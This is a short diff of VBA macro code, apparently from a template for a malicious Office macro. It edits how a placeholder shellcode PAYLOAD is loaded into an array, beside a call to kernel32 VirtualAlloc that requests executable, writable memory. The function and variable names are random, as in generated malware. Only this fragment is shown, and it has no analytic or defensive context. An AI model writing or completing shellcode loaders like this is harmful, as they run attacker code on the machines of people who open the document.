@@ -12,7 +12,7 @@ Function NTj()
     Dim EOu As Long
     Dim ETC As Long
 
-    HoR = Array(PAYLOAD)
+    HoR = PAYLOAD
 
     EOu = stdCallA("kernel32", "VirtualAlloc", vbLong, 0&, UBound(HoR), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
     
